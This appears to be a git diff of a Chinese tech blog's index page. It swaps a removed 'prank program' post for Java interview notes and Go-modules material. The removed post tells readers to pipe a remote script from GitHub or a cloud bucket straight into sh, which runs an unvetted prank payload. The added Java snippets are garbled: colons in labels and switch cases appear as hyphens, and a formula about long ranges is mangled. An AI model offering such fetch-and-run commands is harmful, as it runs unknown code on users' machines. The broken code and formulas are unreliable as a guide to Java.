@@ -182,32 +182,45 @@ var _hmt = _hmt || [];
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-yuque/整蛊小程序" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-yuque/java小抄3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/">整蛊小程序</a>
+      <a class="article-title" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%843/">java小抄3</a>
     </h1>
   
 
         
-        <a href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/" class="archive-article-date">
-  	<time datetime="2021-01-26T12:27:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-26</time>
+        <a href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%843/" class="archive-article-date">
+  	<time datetime="2022-01-01T13:38:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="中午-12-点以后才能发作"><a href="#中午-12-点以后才能发作" class="headerlink" title="中午 12 点以后才能发作"></a>中午 12 点以后才能发作</h3><h2 id="Mac-版本"><a href="#Mac-版本" class="headerlink" title="Mac 版本"></a>Mac 版本</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/190217/1612456252512-9464128e-baa8-4e90-982d-40f9ac06b5d5.png#height=182&id=G4fXp&margin=%5Bobject%20Object%5D&name=image.png&originHeight=364&originWidth=318&originalType=binary%E2%88%B6=1&size=46979&status=done&style=none&width=159" alt="image.png"><br>打开 终端 输入下面命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 国外</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/zy84338719/-static/main/app.sh )</span>&quot;</span></span><br><span class="line"><span class="comment"># 国内</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://demo-1251965636.cos.ap-beijing.myqcloud.com/happy/app.sh )</span>&quot;</span></span><br></pre></td></tr></table></figure>
+        <h3 id="1、一个”-java”源文件中是否可以包括多个类（不是内部类）？有什么限制？"><a href="#1、一个”-java”源文件中是否可以包括多个类（不是内部类）？有什么限制？" class="headerlink" title="1、一个”.java”源文件中是否可以包括多个类（不是内部类）？有什么限制？"></a>1、一个”.java”源文件中是否可以包括多个类（不是内部类）？有什么限制？</h3><p>可以有多个类，但只能有一个 public 的类，并且 public 的类名必须与文件名相一致。</p>
+<h3 id="2、Java-有没有-goto"><a href="#2、Java-有没有-goto" class="headerlink" title="2、Java 有没有 goto?"></a>2、Java 有没有 goto?</h3><p>java 中的保留字，现在没有在 java 中使用。（可以明确的说现在使用的人就是有病）</p>
+<h3 id="3、说说-amp-和-amp-amp-的区别。"><a href="#3、说说-amp-和-amp-amp-的区别。" class="headerlink" title="3、说说&amp;和&amp;&amp;的区别。"></a>3、说说&amp;和&amp;&amp;的区别。</h3><p>&amp;和&amp;&amp;都可以用作逻辑与的运算符，表示逻辑与（and），当运算符两边的表达式的结果都为 true 时，整个运算结果才为 true，否则，只要有一方为 false，则结果为 false。<br>&amp;&amp;还具有短路的功能，即如果第一个表达式为 false，则不再计算第二个表达式，例如，对于 if(str != null &amp;&amp; !str.equals(“”))表达式，当 str 为 null 时，后面的表达式不会执行，所以不会出现 NullPointerException 如果将&amp;&amp;改为&amp;，则会抛出 NullPointerException 异常。If(x33 &amp; ++y&gt;0) y 会增长，If(x33 &amp;&amp; ++y&gt;0)不会增长。<br>&amp;还可以用作位运算符，当&amp;操作符两边的表达式不是 boolean 类型时，&amp;表示按位与操作，我们通常使用 0x0f 来与一个整数进行&amp;运算，来获取该整数的最低 4 个 bit 位，例如，0x31 &amp; 0x0f 的结果为 0x01。</p>
+<h3 id="4、在-JAVA-中如何跳出当前的多重嵌套循环？"><a href="#4、在-JAVA-中如何跳出当前的多重嵌套循环？" class="headerlink" title="4、在 JAVA 中如何跳出当前的多重嵌套循环？"></a>4、在 JAVA 中如何跳出当前的多重嵌套循环？</h3><p>在 Java 中，要想跳出多重循环，可以在外面的循环语句前定义一个标号，然后在里层循环体的代码中使用带有标号的 break  语句，即可跳出外层循环。另外，我个人通常并不使用标号这种方式，而是让外层的循环条件表达式的结果可以受到里层循环体代码的控制。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> a = <span class="keyword">false</span>;</span><br><span class="line">    ok-&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span> ok;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test3</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> a = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>&amp;&amp;a;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">5</span>)&#123;</span><br><span class="line">                a = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭</span></span><br><span class="line">ps -ax |grep happy</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 6663 ttys001    0:00.00 happy</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">kill</span> -9 6663</span><br></pre></td></tr></table></figure>
+<h3 id="5、switch-语句能否作用在-byte-上，能否作用在-long-上，能否作用在-String-上"><a href="#5、switch-语句能否作用在-byte-上，能否作用在-long-上，能否作用在-String-上" class="headerlink" title="5、switch 语句能否作用在 byte 上，能否作用在 long 上，能否作用在 String 上?"></a>5、switch 语句能否作用在 byte 上，能否作用在 long 上，能否作用在 String 上?</h3><p>在 switch（expr1）中，expr1 只能是一个整数表达式或者枚举常量（更大字体），整数表达式可以是 int 基本类型或 Integer 包装类型，由于，byte,short,char 都可以隐含转换为 int，所以，这些类型以及这些类型的包装类型也是可以的。显然，long 类型不符合 switch 的语法规定，并且不能被隐式转换成 int 类型，所以，它不能作用于 swtich 语句中。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    Scanner sc=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    System.out.print(<span class="string">&quot;请输入一个学生的成绩：&quot;</span>);</span><br><span class="line">    String score = sc.next();</span><br><span class="line">    String level=<span class="string">&quot;&quot;</span>;<span class="comment">//等级</span></span><br><span class="line">    <span class="keyword">switch</span>(score)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;A&quot;</span>-level=<span class="string">&quot;90-100&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;B&quot;</span>-level=<span class="string">&quot;80-89&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;C&quot;</span>-level=<span class="string">&quot;70-79&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;D&quot;</span>-level=<span class="string">&quot;60-69&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;E&quot;</span>-level=<span class="string">&quot;0-59&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span> -level=<span class="string">&quot;error&quot;</span>;<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;您的成绩对应的等级是：&quot;</span>+level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>源代码<br><a target="_blank" rel="noopener" href="https://github.com/zy84338719/golang-daily/tree/master/happy">https://github.com/zy84338719/golang-daily/tree/master/happy</a></p>
+<p>1.switch 后面的(),里面返回的是一个具体的数值：byte ,short,char ,int ,jdk1.5 增加了枚举；JDK 1.7 之后 可以是 String 2.这个数值会依次跟 case 后面的数值进行比较，只要满足就执行后面的代码，直到遇到 break 结束 3.在每个分支后面要加上一个关键字 break<br>4.default 就是一个备胎的作用。其余的分支假如都没有走，那么一定会走 default 里面的代码。（类似 if 多分钟中的 else 结构）<br>default 可以写在任意的位置上，但是要写 break 结束语句。<br>假如放在最后一行，break 可以省略不写。（建议写在最后一行–可读性好）<br>5.switch 能解决的，if 都能解决，if 能解决的 switch 不一定能解决。</p>
+<h3 id="6、short-s1-1-s1-s1-1-有什么错-short-s1-1-s1-1-有什么错"><a href="#6、short-s1-1-s1-s1-1-有什么错-short-s1-1-s1-1-有什么错" class="headerlink" title="6、short s1 = 1; s1 = s1 + 1;有什么错? short s1 = 1; s1 += 1;有什么错?"></a>6、short s1 = 1; s1 = s1 + 1;有什么错? short s1 = 1; s1 += 1;有什么错?</h3><p>对于 short s1 = 1; s1 = s1 + 1;  由于 s1+1 运算时会自动提升表达式的类型，所以结果是 int 型，再赋值给 short 类型 s1 时，编译器将报告需要强制转换类型的错误。<br>对于 short s1 = 1; s1 += 1;由于  +=  是 java 语言规定的运算符，java 编译器会对它进行特殊处理，因此可以正确编译。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test4</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">short</span> s1 = <span class="number">1</span>;</span><br><span class="line">    s1 = s1 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>�</p>
+<h3 id="7-char-型变量中能不能存贮一个中文汉字-双字符-为什么"><a href="#7-char-型变量中能不能存贮一个中文汉字-双字符-为什么" class="headerlink" title="7.char 型变量中能不能存贮一个中文汉字(双字符)?为什么?"></a>7.char 型变量中能不能存贮一个中文汉字(双字符)?为什么?</h3><p>char 型变量是用来存储 Unicode 编码的字符的，unicode 编码字符集中包含了汉字，所以，char 型变量中当然可以存储汉字啦。不过，如果某个特殊的汉字没有被包含在 unicode 编码字符集中，那么，这个 char 型变量中就不能存储这个特殊汉字。补充说明：unicode 编码占用两个字节，所以，char 类型的变量也是占用两个字节。</p>
+<h3 id="8、用最有效率的方法算出-2-乘以-8-等于几"><a href="#8、用最有效率的方法算出-2-乘以-8-等于几" class="headerlink" title="8、用最有效率的方法算出 2 乘以 8 等于几?"></a>8、用最有效率的方法算出 2 乘以 8 等于几?</h3><p>8 &lt;&lt; 1</p>
+<h3 id="9、请设计一个一百亿的计算器"><a href="#9、请设计一个一百亿的计算器" class="headerlink" title="9、请设计一个一百亿的计算器"></a>9、请设计一个一百亿的计算器</h3><p>这种问题就是想问你对 long 的表示范围的了解，1010=(210)^10 超过了 long 的表示范围，可以使用 biginteger 直接使用。如果非要实现可以将其保存为 String 然后单个符号位进行计算。</p>
+<h3 id="10、使用-final-关键字修饰一个变量时，是引用不能变，还是引用的对象不能变？"><a href="#10、使用-final-关键字修饰一个变量时，是引用不能变，还是引用的对象不能变？" class="headerlink" title="10、使用 final 关键字修饰一个变量时，是引用不能变，还是引用的对象不能变？"></a>10、使用 final 关键字修饰一个变量时，是引用不能变，还是引用的对象不能变？</h3><p>使用 final 关键字修饰一个变量时，是指引用变量不能变，引用变量所指向的对象中的内容还是可以改变的。例如，对于如下语句：<br>final StringBuffer a=new StringBuffer(“immutable”);<br>执行如下语句将报告编译期错误：a=new StringBuffer(“”);<br>但是，执行如下语句则可以通过编译： a.append(“ broken!”);</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">final</span> StringBuffer a = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;immutable&quot;</span>);</span><br><span class="line"><span class="comment">//虽然不可以被重新赋值，但是可以进行添加元素；可以简单的理解为不可变指针数组追加元素问题。</span></span><br><span class="line"><span class="comment">//        a = new StringBuffer(&quot;&quot;);</span></span><br><span class="line">        a.append(<span class="string">&quot; broken!&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
       
 
@@ -220,7 +233,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/26/yuque/%E6%95%B4%E8%9B%8A%E5%B0%8F%E7%A8%8B%E5%BA%8F/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%843/">展开全文 >></a>
         </p>
       
 
@@ -250,27 +263,33 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-yuque/python 日常办公" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-yuque/java小抄2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/">python 日常办公</a>
+      <a class="article-title" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%842/">java小抄2</a>
     </h1>
   
 
         
-        <a href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/" class="archive-article-date">
-  	<time datetime="2021-01-17T12:50:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-17</time>
+        <a href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%842/" class="archive-article-date">
+  	<time datetime="2022-01-01T13:36:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><a target="_blank" rel="noopener" href="https://www.yuque.com/yichu/python">https://www.yuque.com/yichu/python</a></p>
+        <p>之所以把这个文档叫做小抄的原因，是因为这个文档很杂碎，很小的知识点。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#今天看到个东西，🤦‍♂️</span><br><span class="line">System.cout.println();</span><br><span class="line">#注意这是cout。报错没有这个方法</span><br><span class="line">String st = <span class="string">&quot; world&quot;</span>;</span><br><span class="line">st.concat(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">#注意这个方法返回的是concat会创建一个新的对象，新对象的内容是&quot;hello world&quot;;</span><br><span class="line">System.out.println(st);</span><br><span class="line">#结果是 world</span><br></pre></td></tr></table></figure>
+
+<p>做题做到了这个题，虽然自己知道结果是什么但是忽然想到{}代码块的时候输出顺序是什么！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> B();</span><br><span class="line">        a=<span class="keyword">new</span> B();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;<span class="comment">//静态语块</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">B</span><span class="params">()</span></span>&#123;<span class="comment">//构造函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;<span class="comment">//构造语块</span></span><br><span class="line">        System.out.println(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然这个题很无聊，但是自己还是做的含糊不清。尤其是第二次 a = new B()的时候；发现自己对于这里掌握不是很好。查了一下需要有很多改进的地方。第一静态变量只会加载一次 仅仅是静态加载一次。<br>class B extends A 优先加载两个方法中的静态方法，然后加载静态代码块。<br>总结是优先级 1.静态语块（从父到子）。2.构造语块。3.构造函数</p>
 
       
 
@@ -283,7 +302,7 @@ var _hmt = _hmt || [];
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/17/yuque/python%20%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%842/">展开全文 >></a>
         </p>
       
 
@@ -313,426 +332,843 @@ var _hmt = _hmt || [];
 
 
   
-    <article id="post-yuque/Go Mod 终极入门指南" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-yuque/java小抄1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/">Go Mod 终极入门指南</a>
+      <a class="article-title" href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%841/">java小抄1</a>
     </h1>
   
 
         
-        <a href="/2021/01/16/yuque/Go%20Mod%20%E7%BB%88%E6%9E%81%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/" class="archive-article-date">
-  	<time datetime="2021-01-16T19:05:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-01-16</time>
+        <a href="/2022/01/01/yuque/java%E5%B0%8F%E6%8A%841/" class="archive-article-date">
+  	<time datetime="2022-01-01T13:34:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-01</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>go modules 是 go 官方包管理方案。<br>go 1.14 已经发布，正式推荐 go modules 可用于生产环境。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/106947/1583056526255-11406b86-8b63-474a-a46e-1c41a469a63d.png#align=left&display=inline&height=539&margin=%5Bobject%20Object%5D&originHeight=539&originWidth=1027&status=done&style=none&width=1027"></p>
-<p>今天这篇文章，来介绍 go modules</p>
-<h2 id="什么是-go-modules"><a href="#什么是-go-modules" class="headerlink" title="什么是 go modules"></a>什么是 go modules</h2><p>go modules 是 Go 语言的依赖解决方案，发布于 go 1.11，成长为 go 1.12，丰富于 go 1.13，正式于 go1.14 推荐在生产环境上使用。</p>
-<p>go modules 目前集成在 go 的工具链中，只要安装了 go， 自然而然就可以使用 go modules 了，而 go modules 的出现也解决了在 go 1.11 前的几个常见争议问题：</p>
-<ol>
-<li>go 语言长久以来的依赖管理问题</li>
-<li>淘汰现在的 GOPATH 使用模式</li>
-<li>统一社区中的其他依赖管理工具（提供了迁移功能）</li>
-</ol>
-<h2 id="GOPATH"><a href="#GOPATH" class="headerlink" title="GOPATH"></a>GOPATH</h2><p>go 1.11 前使用 GOPATH</p>
-<h3 id="GOPATH-是什么"><a href="#GOPATH-是什么" class="headerlink" title="GOPATH 是什么"></a>GOPATH 是什么</h3><p>使用如下命令查看<br>go env</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">GO111MODULE&#x3D;&quot;on&quot;</span><br><span class="line">GOARCH&#x3D;&quot;amd64&quot;</span><br><span class="line">GOBIN&#x3D;&quot;&quot;</span><br><span class="line">GOCACHE&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;Library&#x2F;Caches&#x2F;go-build&quot;</span><br><span class="line">GOENV&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;Library&#x2F;Application Support&#x2F;go&#x2F;env&quot;</span><br><span class="line">GOEXE&#x3D;&quot;&quot;</span><br><span class="line">GOFLAGS&#x3D;&quot;&quot;</span><br><span class="line">GOHOSTARCH&#x3D;&quot;amd64&quot;</span><br><span class="line">GOHOSTOS&#x3D;&quot;darwin&quot;</span><br><span class="line">GOINSECURE&#x3D;&quot;&quot;</span><br><span class="line">GOMODCACHE&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;go&#x2F;pkg&#x2F;mod&quot;</span><br><span class="line">GONOPROXY&#x3D;&quot;&quot;</span><br><span class="line">GONOSUMDB&#x3D;&quot;&quot;</span><br><span class="line">GOOS&#x3D;&quot;darwin&quot;</span><br><span class="line">GOPATH&#x3D;&quot;&#x2F;Users&#x2F;zhangyi&#x2F;go&quot;</span><br><span class="line">GOPRIVATE&#x3D;&quot;&quot;</span><br><span class="line">GOPROXY&#x3D;&quot;https:&#x2F;&#x2F;goproxy.cn,direct&quot;</span><br><span class="line">GOROOT&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;go&#x2F;1.15.5&#x2F;libexec&quot;</span><br><span class="line">GOSUMDB&#x3D;&quot;sum.golang.org&quot;</span><br><span class="line">GOTMPDIR&#x3D;&quot;&quot;</span><br><span class="line">GOTOOLDIR&#x3D;&quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;go&#x2F;1.15.5&#x2F;libexec&#x2F;pkg&#x2F;tool&#x2F;darwin_amd64&quot;</span><br><span class="line">GCCGO&#x3D;&quot;gccgo&quot;</span><br><span class="line">AR&#x3D;&quot;ar&quot;</span><br><span class="line">CC&#x3D;&quot;clang&quot;</span><br><span class="line">CXX&#x3D;&quot;clang++&quot;</span><br><span class="line">CGO_ENABLED&#x3D;&quot;1&quot;</span><br><span class="line">GOMOD&#x3D;&quot;&#x2F;dev&#x2F;null&quot;</span><br><span class="line">CGO_CFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_CPPFLAGS&#x3D;&quot;&quot;</span><br><span class="line">CGO_CXXFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_FFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">CGO_LDFLAGS&#x3D;&quot;-g -O2&quot;</span><br><span class="line">PKG_CONFIG&#x3D;&quot;pkg-config&quot;</span><br><span class="line">GOGCCFLAGS&#x3D;&quot;-fPIC -m64 -pthread -fno-caret-diagnostics -Qunused-arguments -fmessage-length&#x3D;0 -fdebug-prefix-map&#x3D;&#x2F;var&#x2F;folders&#x2F;mt&#x2F;w0md4fbn74xggzrf18zb1v_h0000gn&#x2F;T&#x2F;go-build126588908&#x3D;&#x2F;tmp&#x2F;go-build -gno-record-gcc-switches -fno-common&quot;</span><br></pre></td></tr></table></figure>
-
-<p>GOPATH 下包含了三个子目录</p>
+        <h3 id="Java-基础"><a href="#Java-基础" class="headerlink" title="Java 基础"></a>Java 基础</h3><h4 id="1-JDK-和-JRE-有什么区别？"><a href="#1-JDK-和-JRE-有什么区别？" class="headerlink" title="1.JDK 和 JRE 有什么区别？"></a>1.JDK 和 JRE 有什么区别？</h4><ul>
+<li>JDK Java Development Kit 的简称，java 开发工具包，提供了 java 的开发环境和运行环境。</li>
+<li>JRE Java Runtime Environment 的简称，java 运行环境，为 java 的运行提供了所需环境。</li>
+</ul>
+<p>具体来说 JDK 其实包含了 JRE，同时还包含了编译 java 源码的编译器 javac，还包含了很多 java 程序调试和分析的工具。简单来说 如果你需要运行 java 程序，只需安装 JRE 就可以了，如果你需要编写 java 程序，需要安装 JDK。</p>
+<h4 id="2-和-equals-的区别是什么？"><a href="#2-和-equals-的区别是什么？" class="headerlink" title="2.== 和 equals 的区别是什么？"></a>2.== 和 equals 的区别是什么？</h4><p><strong>== 解读</strong><br>对于基本类型和引用类型 == 的作用效果是不同的，如下所示</p>
 <ul>
-<li>bin     存放所有编译生成的二进制文件</li>
-<li>pkg     存放预编译的目标文件，以加快程序的后续编译速度</li>
-<li>src       存入项目代码</li>
+<li>基本类型-比较的是值是否相同；</li>
+<li>引用类型-比较的是引用是否相同；</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$GOPATH</span></span><br><span class="line">❯ ls</span><br><span class="line">bin pkg</span><br></pre></td></tr></table></figure>
+<p>代码示例</p>
